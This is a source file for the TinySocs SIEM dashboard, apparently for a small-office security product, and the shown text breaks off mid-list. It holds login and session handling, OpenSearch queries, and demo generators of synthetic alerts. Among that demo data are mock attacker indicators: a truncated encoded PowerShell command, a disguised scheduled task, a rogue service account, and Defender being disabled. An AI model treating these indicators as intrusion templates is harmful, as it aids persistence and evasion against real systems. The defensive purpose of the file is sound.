# tinysocs/api/dashboard.py
"""
Built-in operator dashboard — served by the bot FastAPI process.

No external JS/CSS dependencies. Everything is inline.
Queries OpenSearch via the bot's Python backend, so the browser
never needs direct SIEM access or credentials.

Mount:  app.mount("/dashboard", dashboard_app)
Browse: http://localhost:8090/dashboard
"""

from __future__ import annotations

import hashlib
import hmac
import json
import os
import random
import secrets
import traceback
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

from fastapi import Body, FastAPI, Header, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse, Response

dashboard_app = FastAPI(title="TinySocs Dashboard", docs_url=None, redoc_url=None)

# ---------------------------------------------------------------------------
# Demo mode (Phase 17 M0) — serve synthetic data without OpenSearch
# ---------------------------------------------------------------------------
_DEMO_MODE = os.getenv("TINYSOCS_DEMO_MODE", "").strip().lower() in ("1", "true", "yes")

# ---------------------------------------------------------------------------
# Dashboard authentication (M0 — Phase 13)
# Uses SIEM_PASS as the single admin password. No more hardcoded "tinysocs".
# ---------------------------------------------------------------------------
_AUTH_TOKEN_SECRET = secrets.token_hex(32)  # rotates each process restart
_active_sessions: Dict[str, float] = {}    # token -> expiry timestamp
_SESSION_TTL = 86400  # 24 hours


def _get_admin_password() -> str:
    """Return the current admin password (SIEM_PASS from env or assistant.env)."""
    pw = os.getenv("SIEM_PASS", "").strip()
    if pw:
        return pw
    # Try reading from assistant.env file directly
    env_path = _find_assistant_env_for_auth()
    if env_path and env_path.is_file():
        for line in env_path.read_text(encoding="utf-8", errors="replace").splitlines():
            line = line.strip()
            if line.startswith("SIEM_PASS="):
                val = line.split("=", 1)[1].strip()
                if val:
                    return val
    return ""  # empty = force setup on first access


def _find_assistant_env_for_auth() -> Optional[Path]:
    """Locate assistant.env (duplicated to avoid forward-ref issues)."""
    candidates = [
        Path(os.getenv("ProgramData", "C:\\ProgramData")) / "TinySocs" / "Assistant" / "assistant.env",
        Path(os.getenv("ProgramFiles", "C:\\Program Files")) / "TinySocs" / "Assistant" / "assistant.env",
        Path("/var/lib/tinysocs/assistant.env"),
    ]
    for p in candidates:
        if p.is_file():
            return p
    return None


def _create_session_token() -> str:
    """Create a new session token and store it."""
    import time
    token = secrets.token_hex(32)
    _active_sessions[token] = time.time() + _SESSION_TTL
    now = time.time()
    expired = [t for t, exp in _active_sessions.items() if exp < now]
    for t in expired:
        _active_sessions.pop(t, None)
    return token


_MAX_SESSIONS = 500  # cap to prevent unbounded growth
_session_gc_counter = 0


def _validate_session(token: str) -> bool:
    """Check if a session token is valid and not expired.
    Implements sliding-window renewal: each successful check extends the TTL."""
    global _session_gc_counter
    import time
    if not token:
        return False
    expiry = _active_sessions.get(token)
    if expiry is None:
        return False
    now = time.time()
    if now > expiry:
        _active_sessions.pop(token, None)
        return False
    # Sliding renewal — extend session on every valid request
    _active_sessions[token] = now + _SESSION_TTL
    # Periodic GC: prune expired sessions when dict grows large
    _session_gc_counter += 1
    if _session_gc_counter >= 50 or len(_active_sessions) > _MAX_SESSIONS:
        _session_gc_counter = 0
        stale = [k for k, exp in _active_sessions.items() if exp <= now]
        for k in stale:
            _active_sessions.pop(k, None)
    return True


# ---------------------------------------------------------------------------
# Rate limiting for login endpoint (anti-brute-force) — Phase 14 M0
# ---------------------------------------------------------------------------
import time as _time_mod

_login_attempts: Dict[str, list] = {}  # IP -> [timestamps]
_RATE_LIMIT_WINDOW = 60   # seconds
_RATE_LIMIT_MAX = 5       # max attempts per window


def _check_rate_limit(ip: str) -> bool:
    """Return True if the IP is rate-limited (should block)."""
    now = _time_mod.time()
    attempts = _login_attempts.get(ip, [])
    attempts = [t for t in attempts if now - t < _RATE_LIMIT_WINDOW]
    _login_attempts[ip] = attempts
    return len(attempts) >= _RATE_LIMIT_MAX


def _record_login_attempt(ip: str) -> None:
    """Record a login attempt for rate limiting."""
    now = _time_mod.time()
    if ip not in _login_attempts:
        _login_attempts[ip] = []
    _login_attempts[ip].append(now)
    # GC: prune stale IPs when dict grows large
    if len(_login_attempts) > 1000:
        cutoff = now - _RATE_LIMIT_WINDOW
        stale = [k for k, v in _login_attempts.items() if not v or v[-1] < cutoff]
        for k in stale:
            _login_attempts.pop(k, None)


@dashboard_app.post("/api/auth/login")
def api_auth_login(request: Request, body: Dict[str, Any] = Body(...)):
    """Authenticate with the admin password (SIEM_PASS)."""
    client_ip = request.client.host if request.client else "unknown"
    if _check_rate_limit(client_ip):
        return JSONResponse(status_code=429, content={
            "error": "Too many login attempts. Try again in 60 seconds."
        })
    _record_login_attempt(client_ip)
    password = body.get("password", "")
    admin_pw = _get_admin_password()
    if not admin_pw:
        return JSONResponse(status_code=503, content={
            "error": "No admin password configured. Run the installer or set SIEM_PASS in assistant.env."
        })
    if not hmac.compare_digest(password, admin_pw):
        return JSONResponse(status_code=401, content={"error": "Invalid password"})
    token = _create_session_token()
    return {"ok": True, "token": token}


@dashboard_app.get("/api/auth/check")
def api_auth_check(authorization: str = Header("")):
    """Check if the current session token is valid."""
    token = authorization.replace("Bearer ", "") if authorization.startswith("Bearer ") else authorization
    if _validate_session(token):
        return {"ok": True, "authenticated": True}
    return JSONResponse(status_code=401, content={"ok": False, "authenticated": False})


@dashboard_app.post("/api/auth/change-password")
def api_auth_change_password(body: Dict[str, Any] = Body(...)):
    """Change the admin password (updates SIEM_PASS in assistant.env and live env)."""
    token = body.get("token", "")
    if not _validate_session(token):
        return JSONResponse(status_code=401, content={"error": "Not authenticated"})
    current_password = body.get("current_password", "")
    new_password = body.get("new_password", "")
    admin_pw = _get_admin_password()
    if not hmac.compare_digest(current_password, admin_pw):
        return JSONResponse(status_code=401, content={"error": "Current password is incorrect"})
    if len(new_password) < 8:
        return JSONResponse(status_code=400, content={"error": "New password must be at least 8 characters"})
    os.environ["SIEM_PASS"] = new_password
    env_path = _find_assistant_env_for_auth()
    if env_path and env_path.is_file():
        lines = env_path.read_text(encoding="utf-8", errors="replace").splitlines()
        updated = False
        for i, line in enumerate(lines):
            if line.strip().startswith("SIEM_PASS="):
                lines[i] = f"SIEM_PASS={new_password}"
                updated = True
                break
        if not updated:
            lines.append(f"SIEM_PASS={new_password}")
        env_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    _active_sessions.clear()
    return {"ok": True, "message": "Password changed successfully. Please log in again."}


# ---------------------------------------------------------------------------
# In-memory chat sessions: session_id -> list of Anthropic message dicts
# Persisted to a JSON file so conversations survive restarts / page refreshes.
# ---------------------------------------------------------------------------
_chat_sessions: Dict[str, List[Dict[str, Any]]] = {}
_CHAT_SESSION_FILE: Optional[Path] = None

# ---------------------------------------------------------------------------
# Alert state tracking: alert_id -> {status, tags, notes, updated_at, ...}
# Persisted to a JSON file so state survives restarts.
# ---------------------------------------------------------------------------
_alert_states: Dict[str, Dict[str, Any]] = {}
_ALERT_STATE_FILE: Optional[Path] = None


def _init_alert_state_file() -> Path:
    """Determine and load the alert state persistence file."""
    global _alert_states, _ALERT_STATE_FILE
    if _ALERT_STATE_FILE is not None:
        return _ALERT_STATE_FILE
    candidates = [
        Path(os.getenv("ProgramData", "C:\\ProgramData")) / "TinySocs" / "Assistant" / "alert_states.json",
        Path("/var/lib/tinysocs/alert_states.json"),
        Path.cwd() / "alert_states.json",
    ]
    for p in candidates:
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
            _ALERT_STATE_FILE = p
            if p.is_file():
                _alert_states = json.loads(p.read_text(encoding="utf-8"))
            return p
        except Exception:
            continue
    _ALERT_STATE_FILE = candidates[-1]
    return _ALERT_STATE_FILE


def _save_alert_states() -> None:
    """Persist alert states to disk."""
    try:
        path = _init_alert_state_file()
        path.write_text(json.dumps(_alert_states, indent=2, default=str), encoding="utf-8")
    except Exception:
        pass  # Non-fatal — state is still in memory


def _init_chat_session_file() -> Path:
    """Determine and load the chat session persistence file."""
    global _chat_sessions, _CHAT_SESSION_FILE
    if _CHAT_SESSION_FILE is not None:
        return _CHAT_SESSION_FILE
    candidates = [
        Path(os.getenv("ProgramData", "C:\\ProgramData")) / "TinySocs" / "Assistant" / "chat_sessions.json",
        Path("/var/lib/tinysocs/chat_sessions.json"),
        Path.cwd() / "chat_sessions.json",
    ]
    for p in candidates:
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
            _CHAT_SESSION_FILE = p
            if p.is_file():
                _chat_sessions.update(json.loads(p.read_text(encoding="utf-8")))
            return p
        except Exception:
            continue
    _CHAT_SESSION_FILE = candidates[-1]
    return _CHAT_SESSION_FILE


def _save_chat_sessions() -> None:
    """Persist chat sessions to disk (keeps only last 5 sessions, 20 msgs each)."""
    try:
        path = _init_chat_session_file()
        # Only persist last 5 sessions to keep file small
        keys = list(_chat_sessions.keys())[-5:]
        trimmed = {k: _chat_sessions[k][-20:] for k in keys if k in _chat_sessions}
        path.write_text(json.dumps(trimmed, indent=2, default=str), encoding="utf-8")
    except Exception:
        pass  # Non-fatal


# ---------------------------------------------------------------------------
# Env bootstrap: load assistant.env if env vars are missing
# ---------------------------------------------------------------------------
def _load_assistant_env() -> None:
    """Load SIEM credentials from assistant.env when not already in environment."""
    if os.getenv("SIEM_PASS"):
        return  # Already set (e.g. by bot.py dotenv or NSSM)
    candidates = [
        Path(os.getenv("ProgramData", "C:\\ProgramData")) / "TinySocs" / "Assistant" / "assistant.env",
        Path(os.getenv("ProgramFiles", "C:\\Program Files")) / "TinySocs" / "Assistant" / "assistant.env",
        Path("/var/lib/tinysocs/assistant.env"),  # Linux fallback
    ]
    for p in candidates:
        if p.is_file():
            try:
                for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
                    line = line.strip()
                    if not line or line.startswith("#") or "=" not in line:
                        continue
                    k, _, v = line.partition("=")
                    k, v = k.strip(), v.strip().strip('"').strip("'")
                    if k and k not in os.environ:
                        os.environ[k] = v
            except Exception:
                pass
            break

_load_assistant_env()


# ---------------------------------------------------------------------------
# TLS CA cert resolution (delegated to shared module)
# ---------------------------------------------------------------------------
from tinysocs.tls import resolve_ca_cert as _resolve_ca_cert


# ---------------------------------------------------------------------------
# OpenSearch helper (reuse same pattern as daily_summary)
# ---------------------------------------------------------------------------
import time as _time
import asyncio
from concurrent.futures import ThreadPoolExecutor

# Thread pool for running blocking OpenSearch queries without blocking uvicorn
_os_executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="os-query")

# Connection failure cache: avoid hammering a down SIEM with long timeouts
_siem_fail_cache: Dict[str, Any] = {"error": None, "until": 0.0}
_SIEM_FAIL_CACHE_SECS = 5  # cache a connection failure briefly (local app, recovers fast)


def _os_query(index: str, body: Dict[str, Any], size: int = 0) -> Dict[str, Any]:
    import requests as _req
    try:
        import urllib3 as _u3
        _u3.disable_warnings(_u3.exceptions.InsecureRequestWarning)
    except Exception:
        pass

    # Fast fail if we recently couldn't connect
    now = _time.time()
    if _siem_fail_cache["error"] and now < _siem_fail_cache["until"]:
        raise ConnectionError(_siem_fail_cache["error"])

    url = os.getenv("SIEM_URL", "https://localhost:9201")
    user = os.getenv("SIEM_USER", "admin")
    passwd = os.getenv("SIEM_PASS", "")
    verify = _resolve_ca_cert()

    body["size"] = size
    # ignore_unavailable + allow_no_indices: return empty results instead of 400/404
    # when no concrete index matches a wildcard pattern (e.g. tinysocs-alerts-* on
    # fresh install before any alerts are generated).
    search_url = f"{url.rstrip('/')}/{index}/_search?ignore_unavailable=true&allow_no_indices=true"
    try:
        resp = _req.post(
            search_url,
            json=body,
            auth=(user, passwd),
            verify=verify,
            timeout=(5, 15),  # (connect_timeout, read_timeout)
        )
        # Connection succeeded — clear any cached failure regardless of status code
        _siem_fail_cache["error"] = None
        _siem_fail_cache["until"] = 0.0
        # Handle HTTP errors gracefully (e.g. 400 from bad aggregation field types)
        # Don't use raise_for_status() — it raises HTTPError which inherits from
        # OSError and would be caught by the connection-error handler below.
        if resp.status_code >= 400:
            err_body = ""
            try:
                err_body = resp.text[:300]
            except Exception:
                pass
            print(f"[dashboard] HTTP {resp.status_code} on {index}: {err_body}")
            # Return an error dict directly instead of raising, so this is NOT
            # confused with a connection failure and doesn't pollute the fail cache.
            return {
                "error": f"SIEM query error (HTTP {resp.status_code})",
                "hits": {"total": {"value": 0}, "hits": []},
                "aggregations": {},
            }
        return resp.json()
    except (_req.exceptions.ConnectionError, _req.exceptions.Timeout, OSError) as exc:
        # Cache this failure so parallel requests fail fast
        _siem_fail_cache["error"] = str(exc)[:200]
        _siem_fail_cache["until"] = _time.time() + _SIEM_FAIL_CACHE_SECS
        raise


def _safe_query(index: str, body: Dict[str, Any], size: int = 0) -> Dict[str, Any]:
    """Query with graceful error handling (synchronous wrapper)."""
    try:
        return _os_query(index, body, size)
    except Exception as exc:
        return _format_query_error(index, exc)


async def _safe_query_async(index: str, body: Dict[str, Any], size: int = 0) -> Dict[str, Any]:
    """Query with graceful error handling (async — runs in thread pool)."""
    loop = asyncio.get_event_loop()
    try:
        return await loop.run_in_executor(_os_executor, _os_query, index, body, size)
    except Exception as exc:
        return _format_query_error(index, exc)


def _format_query_error(index: str, exc: Exception) -> Dict[str, Any]:
    """Format a query exception into a friendly error dict."""
    err_type = type(exc).__name__
    err_str = str(exc)
    print(f"[dashboard] query error on {index}: {err_type}: {err_str[:500]}")
    tb = traceback.format_exc()
    for line in tb.strip().splitlines()[-5:]:
        print(f"[dashboard]   {line}")
    if "SSL" in err_type or "SSL" in err_str:
        friendly = f"SIEM SSL error: {err_str[:120]}"
    elif "Connection" in err_type or "ConnectionError" in err_str:
        friendly = "SIEM not connected — check that OpenSearch is running"
    elif "401" in err_str or "403" in err_str:
        friendly = "SIEM authentication failed"
    elif "Timeout" in err_type:
        friendly = "SIEM request timed out"
    else:
        friendly = f"SIEM query failed ({err_type}): {err_str[:120]}"
    return {"error": friendly, "hits": {"total": {"value": 0}, "hits": []}, "aggregations": {}}


# ===========================================================================
# Phase 17 M0 — Demo data generators
# ===========================================================================

def _demo_now() -> datetime:
    return datetime.now(timezone.utc)


def _demo_iso(offset_hours: float = 0) -> str:
    """ISO timestamp relative to now.  offset_hours is negative for past."""
    dt = _demo_now() + __import__("datetime").timedelta(hours=offset_hours)
    return dt.strftime("%Y-%m-%dT%H:%M:%S.000Z")


# Demo hosts
_DEMO_HOSTS = [
    {"hostname": "RECEPTION-PC", "role": "workstation"},
    {"hostname": "FILESERVER-01", "role": "fileserver"},
    {"hostname": "DC-01", "role": "domaincontroller"},
]

# Demo alerts (offsets in hours from now)
_DEMO_ALERTS_TEMPLATE = [
    {"offset": -14, "rule_id": "TS-001", "rule_name": "brute_force_logon",
     "severity": "critical", "host": "RECEPTION-PC",
     "description": "8 failed logon attempts from 203.0.113.47 for user jdoe in 5 minutes",
     "event_count": 8, "matched_events": 8},
    {"offset": -12, "rule_id": "TS-030", "rule_name": "ps_encoded_command",
     "severity": "high", "host": "DC-01",
     "description": "PowerShell encoded command execution detected",
     "event_count": 3, "matched_events": 3},
    {"offset": -10, "rule_id": "TS-010", "rule_name": "local_account_created",
     "severity": "medium", "host": "FILESERVER-01",
     "description": "New local account created: svc_backup",
     "event_count": 1, "matched_events": 1},
    {"offset": -8, "rule_id": "FIM-001", "rule_name": "fim_file_modified",
     "severity": "medium", "host": "FILESERVER-01",
     "description": "File modified: C:\\ClientFiles\\Mergers\\draft.docx",
     "event_count": 1, "matched_events": 1},
    {"offset": -4, "rule_id": "TS-071", "rule_name": "rdp_brute_force",
     "severity": "high", "host": "FILESERVER-01",
     "description": "Off-hours RDP connection attempt from 198.51.100.22",
     "event_count": 4, "matched_events": 4},
    {"offset": -2, "rule_id": "TS-132", "rule_name": "scheduled_task_created",
     "severity": "medium", "host": "DC-01",
     "description": "Scheduled task created: WindowsUpdate_Check",
     "event_count": 1, "matched_events": 1},
    {"offset": -0.75, "rule_id": "TS-080", "rule_name": "defender_realtime_disabled",
     "severity": "high", "host": "RECEPTION-PC",
     "description": "Windows Defender real-time protection disabled",
     "event_count": 1, "matched_events": 1},
]


def _demo_alerts_summary(hours: int = 24) -> dict:
    severity = {"critical": 3, "high": 8, "medium": 17, "low": 14}
    total = sum(severity.values())
    return {
        "hours": hours,
        "total": total,
        "severity": severity,
        "top_rules": [
            {"rule": "brute_force_logon", "count": 5},
            {"rule": "ps_encoded_command", "count": 4},
            {"rule": "fim_file_modified", "count": 3},
            {"rule": "rdp_brute_force", "count": 3},
            {"rule": "local_account_created", "count": 2},
        ],
        "top_hosts": [
            {"host": "RECEPTION-PC", "count": 18},
            {"host": "FILESERVER-01", "count": 14},
            {"host": "DC-01", "count": 10},
        ],
        "error": None,
    }


def _demo_alerts_timeline(hours: int = 24) -> dict:
    now = _demo_now()
    buckets = []
    for i in range(hours):
        t = now + __import__("datetime").timedelta(hours=-(hours - 1 - i))
        hour = t.hour
        # Business-hours bell curve + spike at the brute-force hour
        if 8 <= hour <= 17:
            base = random.randint(2, 5)
        elif 22 <= hour or hour <= 5:
            base = random.randint(0, 1)
        else:
            base = random.randint(1, 3)
        # Spike around the brute-force offset (14 hours ago)
        hours_ago = hours - 1 - i
        if abs(hours_ago - 14) <= 1:
            base += random.randint(4, 7)
        sev = {}
        if base > 0:
            sev["medium"] = max(1, base - 2)
            sev["high"] = min(base, random.randint(0, 2))
            sev["low"] = max(0, base - sev["medium"] - sev["high"])
            if hours_ago >= 13 and hours_ago <= 15:
                sev["critical"] = random.randint(1, 2)
        buckets.append({
            "time": t.strftime("%Y-%m-%dT%H:00:00.000Z"),
            "count": base + sev.get("critical", 0),
            "severity": sev,
        })
    return {"hours": hours, "buckets": buckets, "error": None}


def _demo_detections_fired(hours: int = 24, limit: int = 30) -> dict:
    detections = []
    for idx, a in enumerate(_DEMO_ALERTS_TEMPLATE):
        det_id = f"demo-alert-{idx:04d}"
        alert_id = f"{a['rule_id']}|{a['host']}|{_demo_iso(a['offset'])}"
        detections.append({
            "id": det_id,
            "alert_id": alert_id,
            "rule_id": a["rule_id"],
            "rule_name": a["rule_name"],
            "severity": a["severity"],
            "description": a["description"],
            "event_count": a["event_count"],
            "first_seen": _demo_iso(a["offset"] - 0.1),
            "last_seen": _demo_iso(a["offset"]),
            "timestamp": _demo_iso(a["offset"]),
            "host": a["host"],
            "matched_events": a["matched_events"],
            "status": "new",
            "tags": [],
            "notes": "",
        })
    return {"detections": detections[:limit], "total": len(detections), "error": None}


def _demo_fleet_health() -> dict:
    now_iso = _demo_iso(0)
    hosts = [
        {
            "hostname": "RECEPTION-PC",
            "event_count": 12847,
            "last_seen": _demo_iso(-0.02),
            "first_seen": _demo_iso(-23.5),
            "alert_count": 18,
            "alert_severities": {"critical": 3, "high": 4, "medium": 8, "low": 3},
            "active_detections": ["brute_force_logon", "defender_realtime_disabled"],
            "top_channels": [
                {"channel": "Security", "count": 8420},
                {"channel": "Microsoft-Windows-Sysmon/Operational", "count": 3200},
                {"channel": "System", "count": 1227},
            ],
            "top_event_ids": [
                {"event_id": "4624", "count": 3100},
                {"event_id": "4625", "count": 842},
                {"event_id": "1", "count": 2800},
            ],
            "agent_version": "0.9.0",
            "node_id": "node-local",
            "uptime": "4d 12h 30m",
            "events_shipped": 12847,
            "queue_files": 0,
            "queue_bytes": 0,
            "last_ship_time": _demo_iso(-0.02),
            "heartbeat_ts": _demo_iso(-0.01),
        },
        {
            "hostname": "FILESERVER-01",
            "event_count": 8934,
            "last_seen": _demo_iso(-0.05),
            "first_seen": _demo_iso(-23.8),
            "alert_count": 14,
            "alert_severities": {"high": 2, "medium": 9, "low": 3},
            "active_detections": ["rdp_brute_force", "fim_file_modified", "local_account_created"],
            "top_channels": [
                {"channel": "Security", "count": 5100},
                {"channel": "Microsoft-Windows-Sysmon/Operational", "count": 2400},
                {"channel": "TinySocs-FIM", "count": 1434},
            ],
            "top_event_ids": [
                {"event_id": "4624", "count": 2100},
                {"event_id": "1", "count": 1900},
                {"event_id": "4663", "count": 1100},
            ],
            "agent_version": "0.9.0",
            "node_id": "node-local",
            "uptime": "4d 12h 30m",
            "events_shipped": 8934,
            "queue_files": 0,
            "queue_bytes": 0,
            "last_ship_time": _demo_iso(-0.05),
            "heartbeat_ts": _demo_iso(-0.02),
        },
        {
            "hostname": "DC-01",
            "event_count": 15392,
            "last_seen": _demo_iso(-0.01),
            "first_seen": _demo_iso(-23.9),
            "alert_count": 10,
            "alert_severities": {"high": 1, "medium": 6, "low": 3},
            "active_detections": ["ps_encoded_command", "scheduled_task_created"],
            "top_channels": [
                {"channel": "Security", "count": 10200},
                {"channel": "Microsoft-Windows-Sysmon/Operational", "count": 3100},
                {"channel": "Microsoft-Windows-PowerShell/Operational", "count": 2092},
            ],
            "top_event_ids": [
                {"event_id": "4624", "count": 4500},
                {"event_id": "4672", "count": 3200},
                {"event_id": "4104", "count": 1800},
            ],
            "agent_version": "0.9.0",
            "node_id": "node-local",
            "uptime": "12d 3h 15m",
            "events_shipped": 15392,
            "queue_files": 0,
            "queue_bytes": 0,
            "last_ship_time": _demo_iso(-0.01),
            "heartbeat_ts": _demo_iso(-0.005),
        },
    ]
    return {"hosts": hosts, "error": None}


def _demo_host_timeline(hostname: str = "", hours: int = 24) -> dict:
    now = _demo_now()
    td = __import__("datetime").timedelta
    channels = ["Security", "Microsoft-Windows-Sysmon/Operational", "TinySocs-FIM"]
    all_channels = set(channels)
    buckets = []
    for i in range(hours):
        t = now + td(hours=-(hours - 1 - i))
        hour = t.hour
        if 8 <= hour <= 17:
            sec = random.randint(80, 200)
            sys = random.randint(30, 80)
            fim = random.randint(5, 20)
        else:
            sec = random.randint(10, 40)
            sys = random.randint(5, 20)
            fim = random.randint(0, 5)
        ch = {"Security": sec, "Microsoft-Windows-Sysmon/Operational": sys}
        if fim > 0:
            ch["TinySocs-FIM"] = fim
        buckets.append({
            "time": t.strftime("%Y-%m-%dT%H:00:00.000Z"),
            "count": sum(ch.values()),
            "channels": ch,
        })
    return {
        "hostname": hostname,
        "hours": hours,
        "interval": "1h",
        "buckets": buckets,
        "channels": sorted(all_channels),
        "error": None,
    }


def _demo_events_recent(limit: int = 50) -> dict:
    """Generate synthetic recent events matching the event-schema shape."""
    td = __import__("datetime").timedelta
    event_templates = [
        {"channel": "Security", "event_id": "4624", "host": "RECEPTION-PC",
         "message": "An account was successfully logged on. Subject: SYSTEM. Logon Type: 3. New Logon: jdoe."},
        {"channel": "Security", "event_id": "4625", "host": "RECEPTION-PC",
         "message": "An account failed to log on. Subject: SYSTEM. Failure Reason: Unknown user name or bad password. Account: jdoe. Source: 203.0.113.47."},
        {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "1", "host": "DC-01",
         "message": "Process Create: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -enc SQBuAH..."},
        {"channel": "Security", "event_id": "4720", "host": "FILESERVER-01",
         "message": "A user account was created. New Account: svc_backup. Created By: Administrator."},
        {"channel": "Microsoft-Windows-PowerShell/Operational", "event_id": "4104", "host": "DC-01",
         "message": "Script block logging: Creating Scriptblock text (1 of 1): Get-ADUser -Filter * | Select-Object Name, Enabled"},
        {"channel": "TinySocs-FIM", "event_id": "FIM", "host": "FILESERVER-01",
         "message": "File modified: C:\\ClientFiles\\Mergers\\draft.docx. Action: Modified. Hash changed."},
        {"channel": "Security", "event_id": "4672", "host": "DC-01",
         "message": "Special privileges assigned to new logon. Subject: Administrator. Privileges: SeBackupPrivilege."},
        {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "3", "host": "RECEPTION-PC",
         "message": "Network connection detected. Image: chrome.exe. Destination: 198.51.100.22:443. Protocol: tcp."},
        {"channel": "Security", "event_id": "4688", "host": "RECEPTION-PC",
         "message": "A new process has been created. Creator: explorer.exe. New Process: C:\\Program Files\\App\\app.exe."},
        {"channel": "System", "event_id": "7045", "host": "DC-01",
         "message": "A service was installed in the system. Service Name: WindowsUpdate_Check. Service Type: user mode service."},
    ]
    events = []
    now = _demo_now()
    for i in range(min(limit, 50)):
        tmpl = event_templates[i % len(event_templates)]
        t = now - td(minutes=random.randint(1, 1400))
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
            "host": tmpl["host"],
            "channel": tmpl["channel"],
            "event_id": tmpl["event_id"],
            "message": tmpl["message"][:300],
        })
    events.sort(key=lambda e: e["timestamp"], reverse=True)
    return {"events": events, "total": len(events), "index": "tinysocs-winlog-*", "error": None}


def _demo_version_status() -> dict:
    return {
        "fleet_versions": [
            {"hostname": "RECEPTION-PC", "agent_version": "0.8.9", "status": "outdated-minor"},
            {"hostname": "FILESERVER-01", "agent_version": "0.9.0", "status": "current"},
            {"hostname": "DC-01", "agent_version": "0.9.0", "status": "current"},
        ],
        "has_outdated": True,
        "summary": "1 of 3 agents outdated (RECEPTION-PC: 0.8.9 → 0.9.0)",
        "manifest": {"current_version": "0.9.0"},
    }


def _demo_compliance_report(framework: str = "nist_csf", hours: int = 720) -> dict:
    frameworks = {
        "nist_csf": {
            "name": "NIST CSF 2.0",
            "controls": [
                {"id": "DE.CM-1", "name": "Networks are monitored", "status": "pass", "rules_mapped": 8, "rules_fired": 5},
                {"id": "DE.CM-3", "name": "Personnel activity is monitored", "status": "pass", "rules_mapped": 6, "rules_fired": 3},
                {"id": "DE.AE-2", "name": "Events are analysed to detect attacks", "status": "pass", "rules_mapped": 12, "rules_fired": 7},
                {"id": "DE.AE-3", "name": "Event data are aggregated", "status": "pass", "rules_mapped": 4, "rules_fired": 2},
                {"id": "PR.AC-1", "name": "Identities and credentials managed", "status": "pass", "rules_mapped": 5, "rules_fired": 4},
                {"id": "PR.AC-7", "name": "Users authenticated", "status": "pass", "rules_mapped": 3, "rules_fired": 2},
                {"id": "PR.DS-1", "name": "Data-at-rest is protected", "status": "partial", "rules_mapped": 2, "rules_fired": 1},
                {"id": "PR.DS-5", "name": "Data leakage protections", "status": "partial", "rules_mapped": 1, "rules_fired": 0},
                {"id": "RS.AN-1", "name": "Notifications from detection systems investigated", "status": "pass", "rules_mapped": 7, "rules_fired": 4},
                {"id": "RS.RP-1", "name": "Response plan is executed", "status": "partial", "rules_mapped": 2, "rules_fired": 1},
            ],
        },
        "hipaa": {
            "name": "HIPAA Security Rule",
            "controls": [
                {"id": "164.312(b)", "name": "Audit controls", "status": "pass", "rules_mapped": 10, "rules_fired": 6},
                {"id": "164.312(a)(1)", "name": "Access control", "status": "pass", "rules_mapped": 5, "rules_fired": 3},
                {"id": "164.312(d)", "name": "Person authentication", "status": "pass", "rules_mapped": 4, "rules_fired": 2},
                {"id": "164.308(a)(5)", "name": "Security awareness training", "status": "partial", "rules_mapped": 2, "rules_fired": 1},
                {"id": "164.312(c)(1)", "name": "Integrity controls", "status": "pass", "rules_mapped": 3, "rules_fired": 2},
            ],
        },
        "pci_dss": {
            "name": "PCI DSS v4.0",
            "controls": [
                {"id": "10.2", "name": "Audit logs capture relevant activity", "status": "pass", "rules_mapped": 12, "rules_fired": 8},
                {"id": "10.4", "name": "Audit logs are reviewed", "status": "pass", "rules_mapped": 6, "rules_fired": 4},
                {"id": "8.3", "name": "Strong authentication for users", "status": "pass", "rules_mapped": 4, "rules_fired": 3},
                {"id": "11.5", "name": "File integrity monitoring", "status": "pass", "rules_mapped": 2, "rules_fired": 1},
                {"id": "6.4", "name": "Public-facing web apps protected", "status": "partial", "rules_mapped": 1, "rules_fired": 0},
            ],
        },
    }
    fw = frameworks.get(framework, frameworks["nist_csf"])
    total = len(fw["controls"])
    passed = sum(1 for c in fw["controls"] if c["status"] == "pass")
    partial = sum(1 for c in fw["controls"] if c["status"] == "partial")
    failed = total - passed - partial
    return {
        "ok": True,
        "framework": {"id": framework, "name": fw["name"]},
        "hours": hours,
        "controls": fw["controls"],
        "summary": {"total": total, "pass": passed, "partial": partial, "fail": failed},
    }


def _demo_actions() -> dict:
    """Synthetic guided response actions for demo mode."""
    return {"actions": [
        {
            "action_id": "demo-act-001", "action": "block_ip", "status": "staged",
            "staged_at": _demo_iso(-2.5), "dry_run": True,
            "params": {"ip": "203.0.113.47", "reason": "Triggered by brute_force_logon (critical) on RECEPTION-PC", "host": "RECEPTION-PC", "rule": "brute_force_logon"},
            "runbook": [
                "Verify 203.0.113.47 is not a known partner or VPN endpoint",
                "Check threat intel: AbuseIPDB confidence 87%, GreyNoise: malicious",
                "Add IP to perimeter firewall block list",
                "Review RECEPTION-PC for signs of successful compromise",
                "Reset credentials for any accounts that had failed logons from this IP",
            ],
        },
        {
            "action_id": "demo-act-002", "action": "isolate_host", "status": "staged",
            "staged_at": _demo_iso(-1.0), "dry_run": True,
            "params": {"host": "RECEPTION-PC", "reason": "Defender real-time protection disabled — possible tampering", "rule": "defender_realtime_disabled"},
            "runbook": [
                "Confirm whether Defender was intentionally disabled by IT staff",
                "If unauthorized: network-isolate the host immediately",
                "Run full antimalware scan with secondary tool (e.g., Malwarebytes)",
                "Check for unauthorized processes or scheduled tasks",
                "Re-enable Defender real-time protection and verify it persists",
            ],
        },
        {
            "action_id": "demo-act-003", "action": "disable_user", "status": "acknowledged",
            "staged_at": _demo_iso(-8.0), "dry_run": True,
            "params": {"user": "svc_backup", "reason": "Suspicious new local account created on FILESERVER-01", "rule": "local_account_created"},
            "runbook": [
                "Verify svc_backup was not created by an authorized admin",
                "Check account permissions and group memberships",
                "Disable the account if unauthorized",
                "Audit FILESERVER-01 for lateral movement indicators",
            ],
            "resolved_by": "dashboard-operator", "resolved_at": _demo_iso(-6.0),
        },
        {
            "action_id": "demo-act-004", "action": "open_ticket", "status": "staged",
            "staged_at": _demo_iso(-0.5), "dry_run": True,
            "params": {"title": "Off-hours RDP brute force from 198.51.100.22 targeting FILESERVER-01", "rule": "rdp_brute_force"},
            "runbook": [
                "Review RDP access logs for FILESERVER-01",
